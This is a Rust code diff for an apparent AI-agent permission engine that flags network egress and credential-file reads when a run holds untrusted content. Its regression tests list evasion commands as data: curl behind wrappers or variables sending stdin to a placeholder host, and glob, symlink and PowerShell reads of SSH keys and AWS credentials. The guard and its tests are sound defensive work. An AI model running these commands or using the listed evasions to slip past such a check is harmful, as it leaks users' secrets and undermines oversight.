@@ -9,7 +9,9 @@ use cyber_core::untrusted::{BypassSetting, SignalKind, UntrustedRecord, Untruste
 use cyber_core::wildcard::matches;
 use serde_json::{Value, json};
 
-use super::engine::{Effect, MESSAGE_SEND, Request, Rule, slash};
+use super::engine::{
+    COLLAB_MESSAGE_SEND, COLLAB_TASK_WRITE, Effect, MESSAGE_SEND, Request, Rule, slash,
+};
 
 /// The denial of a taint ask in `dont-ask`, or with no interactive approver attached.
 pub const TAINT_NOT_PRE_APPROVED: &str = "Not pre-approved (untrusted content in this run)";
@@ -141,9 +143,10 @@ const EGRESS_COMMANDS: &[&str] = &[
     "irm",
 ];
 
-/// Prefixes that run the command after them (`sudo curl …`).
+/// Prefixes that run the command after them (`sudo curl …`, `timeout 10 curl …`).
 const WRAPPERS: &[&str] = &[
-    "sudo", "doas", "env", "command", "exec", "nohup", "time", "nice", "xargs",
+    "sudo", "doas", "env", "command", "exec", "nohup", "time", "nice", "xargs", "timeout",
+    "stdbuf", "ionice", "setsid", "flock", "busybox", "unbuffer",
 ];
 
 /// POSIX shells whose inline code (`-c`, `-lc`) the analysis cannot see into, so the
@@ -151,19 +154,58 @@ const WRAPPERS: &[&str] = &[
 const POSIX_SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "fish"];
 const POWERSHELL_INLINE: &[&str] = &["-c", "-command", "-e", "-ec", "-enc", "-encodedcommand"];
 
+/// Git global options whose value is the next word.
+const GIT_VALUE_OPTIONS: &[&str] = &[
+    "-C",
+    "-c",
+    "--git-dir",
+    "--work-tree",
+    "--namespace",
+    "--super-prefix",
+    "--config-env",
+];
+
 fn egress(req: &Request) -> bool {
     match req.action.as_str() {
-        "webfetch" | "websearch" => true,
+        // A shared collaboration server and native input (typing into a browser) can
+        // carry data out like a fetch.
+        "webfetch" | "websearch" | COLLAB_MESSAGE_SEND | COLLAB_TASK_WRITE | "computer.control" => {
+            true
+        }
         MESSAGE_SEND => req.resources.iter().any(|target| target.contains('@')),
-        "bash" => req.unparseable || req.resources.iter().any(|command| egress_command(command)),
+        "bash" => {
+            let powershell = is_powershell(req);
+            req.unparseable
+                || req
+                    .resources
+                    .iter()
+                    .any(|command| egress_command(command, powershell))
+        }
         _ => req.egress,
     }
 }
 
-fn egress_command(command: &str) -> bool {
-    let all = words(command);
+/// A `bash`-action request made by the `powershell` tool, whose commands follow
+/// PowerShell quoting.
+fn is_powershell(req: &Request) -> bool {
+    req.tool.as_deref() == Some("powershell")
+}
+
+fn egress_command(command: &str, powershell: bool) -> bool {
+    // Quoting the tokenizer cannot follow counts as unparseable.
+    let Some(all) = words(command, powershell) else {
+        return true;
+    };
     let words = command_words(&all);
-    if words.len() < all.len() {
+    let wrapped = words.len() < all.len();
+    // A program named by a variable or a substitution (`$c …`, `"$(command -v curl)" …`)
+    // cannot be checked against the list. Behind a wrapper the program may follow one
+    // option value (`timeout 10 $c`), so the second word is checked too.
+    let program_words = if wrapped { 2 } else { 1 };
+    if words.iter().take(program_words).any(|word| !literal(word)) {
+        return true;
+    }
+    if wrapped {
         // Behind assignments or a wrapper, whose options may take values (`sudo -u root
         // curl …`), the program's position is uncertain: every later word is tried.
         return (0..words.len()).any(|start| egress_words(&words[start..]));
@@ -176,11 +218,6 @@ fn egress_words(words: &[String]) -> bool {
         return false;
     };
     let args = &words[1..];
-    let first_arg = |skip_options: bool| {
-        args.iter()
-            .map(String::as_str)
-            .find(|arg| !skip_options || !arg.starts_with('-'))
-    };
     match name.as_str() {
         _ if EGRESS_COMMANDS.contains(&name.as_str()) => true,
         "eval" | "iex" | "invoke-expression" => true,
@@ -194,9 +231,16 @@ fn egress_words(words: &[String]) -> bool {
             .iter()
             .any(|arg| matches!(arg.to_ascii_lowercase().as_str(), "/c" | "/k")),
         "git" => git_egress(args),
-        "npm" | "cargo" => first_arg(true) == Some("publish"),
+        // `publish` behind options and their values (`npm --registry r publish`,
+        // `cargo +stable publish`): any word, since which options take a value is unknown.
+        "npm" | "cargo" => args.iter().any(|arg| arg == "publish"),
         _ => false,
     }
+}
+
+/// A word the shell takes literally as a program name: no expansion or substitution.
+fn literal(word: &str) -> bool {
+    !word.contains(['$', '`'])
 }
 
 /// `git push` and `git remote add`, after git's global options.
@@ -204,8 +248,7 @@ fn git_egress(args: &[String]) -> bool {
     let mut rest = args.iter().map(String::as_str);
     while let Some(arg) = rest.next() {
         match arg {
-            // Global options that take a value.
-            "-C" | "-c" => {
+            _ if GIT_VALUE_OPTIONS.contains(&arg) => {
                 rest.next();
             }
             _ if arg.starts_with('-') => {}
@@ -251,18 +294,30 @@ fn program(word: &str) -> String {
         .map_or(name.clone(), str::to_owned)
 }
 
-/// The words of one simple command, with quotes removed. Close enough for naming the
-/// program and its path arguments; the bash analysis has already split the command.
-fn words(command: &str) -> Vec<String> {
+/// The words of one simple command, with quotes removed, or `None` when its quoting is
+/// unbalanced. Close enough for naming the program and its path arguments; the shell
+/// analysis has already split the command.
+fn words(command: &str, powershell: bool) -> Option<Vec<String>> {
+    if powershell {
+        powershell_words(command)
+    } else {
+        shell_words::split(command).ok()
+    }
+}
+
+/// PowerShell's quoting: the backtick escapes (outside single quotes), a backslash is a
+/// plain character (a Windows path separator), and `''` is a quote inside single quotes.
+fn powershell_words(command: &str) -> Option<Vec<String>> {
     let mut words = Vec::new();
     let mut word = String::new();
     let mut quote: Option<char> = None;
-    let mut chars = command.chars();
     let mut open = false;
+    let mut chars = command.chars().peekable();
     while let Some(c) = chars.next() {
         match (quote, c) {
+            (Some('\''), '\'') if chars.peek() == Some(&'\'') => word.extend(chars.next()),
             (Some(q), c) if c == q => quote = None,
-            (Some('"'), '\\') | (None, '\\') => word.extend(chars.next()),
+            (Some('"') | None, '`') => word.push(chars.next()?),
             (Some(_), c) => word.push(c),
             (None, '\'' | '"') => {
                 quote = Some(c);
@@ -277,10 +332,13 @@ fn words(command: &str) -> Vec<String> {
             (None, c) => word.push(c),
         }
     }
+    if quote.is_some() {
+        return None;
+    }
     if open || !word.is_empty() {
         words.push(word);
     }
-    words
+    Some(words)
 }
 
 /// File names that hold secrets, lower-case.
@@ -309,11 +367,12 @@ fn secret_read(req: &Request, location: &Path, home: &Path) -> bool {
     let resources: Vec<&str> = match req.action.as_str() {
         "read" | "grep" | "glob" => req.resources.iter().map(String::as_str).collect(),
         "bash" => {
+            let powershell = is_powershell(req);
             return req.resources.iter().any(|command| {
-                words(command)
+                shell_words_or_split(command, powershell)
                     .iter()
                     .skip(1)
-                    .any(|word| secret_path(path_argument(word), location, home))
+                    .any(|word| secret_shell_argument(path_argument(word), location, home))
             }) || reads_secret(req, location, home);
         }
         _ => Vec::new(),
@@ -324,6 +383,68 @@ fn secret_read(req: &Request, location: &Path, home: &Path) -> bool {
         || reads_secret(req, location, home)
 }
 
+/// The words of `command`, split on whitespace when its quoting is unbalanced (an
+/// unparseable command is egress anyway; its arguments are still checked).
+pub(crate) fn shell_words_or_split(command: &str, powershell: bool) -> Vec<String> {
+    words(command, powershell)
+        .unwrap_or_else(|| command.split_whitespace().map(str::to_owned).collect())
+}
+
+/// A shell path argument naming a secret, also through a glob the shell would expand
+/// (`cat ~/.a?s/credentials`, `cat config/*.pe?`). A glob that cannot be expanded in
+/// bounds counts as a secret read.
+fn secret_shell_argument(word: &str, location: &Path, home: &Path) -> bool {
+    if secret_path(word, location, home) {
+        return true;
+    }
+    if !word.contains(['*', '?', '[']) {
+        return false;
+    }
+    let pattern = expand(&word.replace('\\', "/"), location, home);
+    expand_glob(&pattern).is_none_or(|paths| {
+        paths
+            .iter()
+            .any(|path| secret_path(&slash(path), location, home))
+    })
+}
+
+/// At most this many paths a shell glob is expanded to.
+const GLOB_EXPANSION_LIMIT: usize = 256;
+
+/// The existing paths `pattern` matches, one component at a time as the shell expands it,
+/// or `None` when that is unbounded (`**`, too many matches, an invalid pattern).
+fn expand_glob(pattern: &Path) -> Option<Vec<PathBuf>> {
+    let mut paths = vec![PathBuf::new()];
+    for component in pattern.components() {
+        let part = component.as_os_str().to_string_lossy();
+        if !part.contains(['*', '?', '[']) {
+            paths.iter_mut().for_each(|path| path.push(component));
+            continue;
+        }
+        if part.contains("**") {
+            return None;
+        }
+        let matcher = globset::Glob::new(&part).ok()?.compile_matcher();
+        let mut next = Vec::new();
+        for dir in &paths {
+            let Ok(entries) = std::fs::read_dir(dir) else {
+                continue;
+            };
+            next.extend(
+                entries
+                    .filter_map(Result::ok)
+                    .filter(|entry| matcher.is_match(entry.file_name()))
+                    .map(|entry| dir.join(entry.file_name())),
+            );
+            if next.len() > GLOB_EXPANSION_LIMIT {
+                return None;
+            }
+        }
+        paths = next;
+    }
+    Some(paths)
+}
+
 fn reads_secret(req: &Request, location: &Path, home: &Path) -> bool {
     req.reads
         .iter()
@@ -331,7 +452,7 @@ fn reads_secret(req: &Request, location: &Path, home: &Path) -> bool {
 }
 
 /// The path a shell word names: `@file` (curl data), `<file`, and `--opt=file`.
-fn path_argument(word: &str) -> &str {
+pub(crate) fn path_argument(word: &str) -> &str {
     let word = word.trim_start_matches(['@', '<']);
     match word.split_once('=') {
         Some((option, value)) if option.starts_with('-') => value,
@@ -339,39 +460,85 @@ fn path_argument(word: &str) -> &str {
     }
 }
 
-/// Whether `raw` (a resource, a path argument or a glob pattern) names a secret path.
+/// Whether `raw` (a resource, a path argument or a glob pattern) names a secret path,
+/// as written or, for an existing path, after resolving symbolic links (a committed
+/// `notes.txt -> deploy.pem`). A backslash is a path separator, as in PowerShell.
 pub(crate) fn secret_path(raw: &str, location: &Path, home: &Path) -> bool {
     if raw.is_empty() {
         return false;
     }
-    let path = crate::bash_analysis::normalize(&expand(raw, location, home));
+    let path = crate::bash_analysis::normalize(&expand(&raw.replace('\\', "/"), location, home));
+    if secret_name(&path) || secret_home_path(&path, home) {
+        return true;
+    }
+    let Ok(resolved) = std::fs::canonicalize(&path).map(|path| without_verbatim(&path)) else {
+        return false;
+    };
+    let real_home =
+        std::fs::canonicalize(home).map_or_else(|_| home.to_path_buf(), |h| without_verbatim(&h));
+    secret_name(&resolved)
+        || secret_home_path(&resolved, home)
+        || secret_home_path(&resolved, &real_home)
+}
+
+fn secret_name(path: &Path) -> bool {
     let name = path
         .file_name()
         .map(|name| name.to_string_lossy().to_lowercase())
         .unwrap_or_default();
-    let named = !matches("*.env.example", &name)
-        && SECRET_NAMES.iter().any(|pattern| matches(pattern, &name));
-    named || secret_home_path(&path, home)
+    !matches("*.env.example", &name) && SECRET_NAMES.iter().any(|pattern| matches(pattern, &name))
+}
+
+/// A canonical Windows path without its verbatim `\\?\` prefix, so it compares with the
+/// home directory; other paths unchanged.
+fn without_verbatim(path: &Path) -> PathBuf {
+    let text = path.to_string_lossy();
+    match text
+        .strip_prefix(r"\\?\")
+        .or_else(|| text.strip_prefix("//?/"))
+    {
+        Some(rest) if !rest.starts_with("UNC") => PathBuf::from(rest),
+        _ => path.to_path_buf(),
+    }
 }
 
 fn secret_home_path(path: &Path, home: &Path) -> bool {
-    let Ok(rel) = path.strip_prefix(home) else {
+    // Windows paths compare without regard to case.
+    let fold = |path: &Path| {
+        let text = slash(path);
+        if cfg!(windows) {
+            text.to_lowercase()
+        } else {
+            text
+        }
+    };
+    let (path, home) = (fold(&without_verbatim(path)), fold(&without_verbatim(home)));
+    let Some(rel) = path
+        .strip_prefix(home.trim_end_matches('/'))
+        .and_then(|rest| rest.strip_prefix('/'))
+    else {
         return false;
     };
-    let rel = slash(rel);
     SECRET_HOME_DIRS
         .iter()
         .any(|dir| rel == *dir || rel.starts_with(&format!("{dir}/")))
-        || SECRET_HOME_FILES.contains(&rel.as_str())
+        || SECRET_HOME_FILES.contains(&rel)
 }
 
+/// Spellings of the home directory a path may start with: POSIX shells' and
+/// PowerShell's (whose variable names ignore case).
+const HOME_PREFIXES: &[&str] = &["~", "${home}", "$home", "$env:userprofile", "$env:home"];
+
 fn expand(raw: &str, location: &Path, home: &Path) -> PathBuf {
-    let home_relative = ["~/", "$HOME/", "${HOME}/"]
-        .iter()
-        .find_map(|prefix| raw.strip_prefix(prefix));
+    let lower = raw.to_ascii_lowercase();
+    let home_relative = HOME_PREFIXES.iter().find_map(|prefix| {
+        let rest = lower.strip_prefix(prefix)?;
+        // `$HOME` is case-sensitive in POSIX shells, but reading it in any case as home
+        // only errs toward a secret.
+        (rest.is_empty() || rest.starts_with('/')).then(|| &raw[raw.len() - rest.len()..])
+    });
     match home_relative {
-        Some(rest) => home.join(rest),
-        None if matches!(raw, "~" | "$HOME" | "${HOME}") => home.to_path_buf(),
+        Some(rest) => home.join(rest.trim_start_matches('/')),
         None if Path::new(raw).is_absolute() || raw.starts_with('/') => PathBuf::from(raw),
         None => location.join(raw),
     }
@@ -395,7 +562,9 @@ pub(crate) fn read_only_shell(req: &Request) -> bool {
         && req.mutates.is_empty()
         && !req.resources.is_empty()
         && req.resources.iter().all(|command| {
-            let words = words(command);
+            let Some(words) = words(command, is_powershell(req)) else {
+                return false;
+            };
             let words = command_words(&words);
             let Some(name) = words.first().map(|word| program(word)) else {
                 return false;
@@ -649,12 +818,143 @@ mod tests {
         assert!(!read_only_shell(&unparseable));
     }
 
+    /// Windows canonical paths compare with and without their verbatim prefix.
     #[test]
-    fn words_drop_quotes_and_keep_empty_arguments() {
+    fn verbatim_prefixes_are_dropped_for_comparison() {
         assert_eq!(
-            words(r#"curl -H "a b" 'c d' e\ f """#),
-            ["curl", "-H", "a b", "c d", "e f", ""]
+            without_verbatim(Path::new(r"\\?\C:\Users\u")),
+            PathBuf::from(r"C:\Users\u")
         );
+        assert_eq!(
+            without_verbatim(Path::new("//?/C:/u")),
+            PathBuf::from("C:/u")
+        );
+        let unc = Path::new(r"\\?\UNC\server\share");
+        assert_eq!(without_verbatim(unc), unc);
+        let home = Path::new("//?/C:/home/u");
+        assert!(secret_home_path(Path::new("C:/home/u/.ssh/id_rsa"), home));
+    }
+
+    /// PowerShell words keep backslashes (path separators) and unescape backticks; an
+    /// unbalanced quote does not tokenize.
+    #[test]
+    fn powershell_words_follow_powershell_quoting() {
+        assert_eq!(
+            powershell_words(r#"C:\Windows\curl.exe -H "a`"b" 'it''s' a` b"#).unwrap(),
+            [r"C:\Windows\curl.exe", "-H", "a\"b", "it's", "a b"]
+        );
+        assert!(powershell_words("Get-Content 'x").is_none());
+        assert!(words("cat 'x", false).is_none());
+    }
+
+    /// Regression: PowerShell commands with backslash paths lost their separators, so a
+    /// full path to `curl.exe` or a secret file was not recognized.
+    #[test]
+    fn powershell_backslash_paths_are_classified() {
+        let ps = |command: &str| Request {
+            tool: Some("powershell".into()),
+            ..request("bash", &[command])
+        };
+        assert_eq!(
+            risk_of(&ps(r"C:\Windows\System32\curl.exe https://x.example")),
+            Some(Risk::Egress)
+        );
+        let home = slash(&home()).replace('/', "\\");
+        for command in [
+            r"Get-Content ~\.aws\credentials".to_string(),
+            r"Get-Content $HOME\.aws\credentials".to_string(),
+            r"Get-Content $env:USERPROFILE\.ssh\id_ed25519".to_string(),
+            format!(r"type {home}\.ssh\config"),
+            r"type C:\Users\u\.ssh\id_rsa".to_string(),
+            r"Get-Content .\config\deploy.pem".to_string(),
+        ] {
+            assert_eq!(risk_of(&ps(&command)), Some(Risk::SecretRead), "{command}");
+        }
+        assert_eq!(risk_of(&ps(r"Get-Content .\src\main.rs")), None);
+    }
+
+    /// Regression: wrappers outside the list, a program named by a variable or a
+    /// substitution, git global options with a separate value, and `publish` behind
+    /// options all hid egress.
+    #[test]
+    fn egress_evasions_are_risky() {
+        for command in [
+            "timeout 10 curl https://x.example",
+            "busybox wget https://x.example",
+            "stdbuf -o0 nc x 1",
+            "setsid flock /tmp/l curl x",
+            "unbuffer ssh host",
+            "ionice -c3 rsync a host:b",
+            "$c -d @- https://x.example",
+            "\"$(command -v curl)\" -d @- https://x.example",
+            "`which curl` x",
+            "timeout 10 $c x",
+            "git --git-dir .git push",
+            "git --work-tree . push",
+            "git --namespace n --super-prefix p push",
+            "git --config-env a=B remote add x https://x.example",
+            "npm --registry https://r publish",
+            "cargo +stable publish",
+            "cat 'unterminated",
+        ] {
+            assert_eq!(
+                risk_of(&request("bash", &[command])),
+                Some(Risk::Egress),
+                "{command}"
+            );
+        }
+        for command in [
+            "timeout 10 cargo test",
+            "git --git-dir .git log",
+            "echo $HOME",
+        ] {
+            assert_eq!(risk_of(&request("bash", &[command])), None, "{command}");
+        }
+    }
+
+    /// Regression: a shell glob in a path argument and a symbolic link hid a secret read.
+    #[test]
+    fn globs_and_symlinks_to_secrets_are_secret_reads() {
+        let dir = tempfile::tempdir().unwrap();
+        let home = dir.path().join("home");
+        let location = home.join("repo");
+        std::fs::create_dir_all(home.join(".aws")).unwrap();
+        std::fs::create_dir_all(location.join("config")).unwrap();
+        std::fs::create_dir_all(location.join("docs")).unwrap();
+        std::fs::write(home.join(".aws/credentials"), "k").unwrap();
+        std::fs::write(location.join("config/deploy.pem"), "k").unwrap();
+        std::fs::write(location.join("config/app.toml"), "k").unwrap();
+        let risk_here = |command: &str| risk(&request("bash", &[command]), &location, &home);
+        assert_eq!(risk_here("cat ~/.a?s/credentials"), Some(Risk::SecretRead));
+        assert_eq!(risk_here("cat config/*.pe?"), Some(Risk::SecretRead));
+        assert_eq!(risk_here("cat config/*"), Some(Risk::SecretRead));
+        assert_eq!(risk_here("cat **/x"), Some(Risk::SecretRead), "unbounded");
+        assert_eq!(risk_here("cat config/*.toml"), None);
+        #[cfg(unix)]
+        {
+            std::os::unix::fs::symlink(
+                location.join("config/deploy.pem"),
+                location.join("docs/notes.txt"),
+            )
+            .unwrap();
+            let read = |path: &str| risk(&request("read", &[path]), &location, &home);
+            assert_eq!(read("docs/notes.txt"), Some(Risk::SecretRead));
+            assert_eq!(risk_here("cat docs/notes.txt"), Some(Risk::SecretRead));
+            assert_eq!(read("config/app.toml"), None);
+        }
+    }
+
+    /// Collaboration writes, native input and MCP resource requests can carry data out.
+    #[test]
+    fn collaboration_and_native_input_are_egress() {
+        for action in [COLLAB_MESSAGE_SEND, COLLAB_TASK_WRITE, "computer.control"] {
+            assert_eq!(
+                risk_of(&request(action, &["*"])),
+                Some(Risk::Egress),
+                "{action}"
+            );
+        }
+        assert_eq!(risk_of(&request("computer.capture", &["*"])), None);
     }
 
     #[test]
@@ -956,6 +1256,34 @@ mod decision_tests {
                 )
             },
             Case {
+                config: json!({"read": "allow"}),
+                ..case(
+                    "MCP resource read asks",
+                    Mode::Default,
+                    Request {
+                        read_only: true,
+                        egress: true,
+                        ..request("read", "mcp:docs:guide.md")
+                    },
+                )
+            },
+            Case {
+                config: json!({"collab.message.send": "allow", "collab.task.write": "allow"}),
+                ..case(
+                    "collaboration message asks",
+                    Mode::Default,
+                    request("collab.message.send", "project:p"),
+                )
+            },
+            Case {
+                config: json!({"computer.control": "allow"}),
+                ..case(
+                    "native input asks",
+                    Mode::AcceptEdits,
+                    request("computer.control", "app:browser"),
+                )
+            },
+            Case {
                 config: json!({"webfetch": "allow"}),
                 parent_modes: vec![Mode::DontAsk],
                 tainted: not_pre_approved(),
@@ -966,6 +1294,28 @@ mod decision_tests {
                 )
             },
         ]
+    }
+
+    /// A taint denial is typed as the taint's, so callers need not read its text.
+    #[test]
+    fn taint_decisions_name_their_source() {
+        use crate::permissions::DecisionSource;
+        let dont_ask = Case {
+            config: json!({"bash": {"curl *": "allow"}}),
+            ..case("dont-ask", Mode::DontAsk, shell("curl https://x.example"))
+        };
+        assert_eq!(
+            policy(&dont_ask, true).decide_with_source(&dont_ask.req),
+            (not_pre_approved(), DecisionSource::Taint)
+        );
+        let denied = Case {
+            config: json!({"webfetch": "deny"}),
+            ..case("deny", Mode::Default, fetch("https://x.example/"))
+        };
+        assert_eq!(
+            policy(&denied, true).decide_with_source(&denied.req).1,
+            DecisionSource::Rules
+        );
     }
 
     #[test]
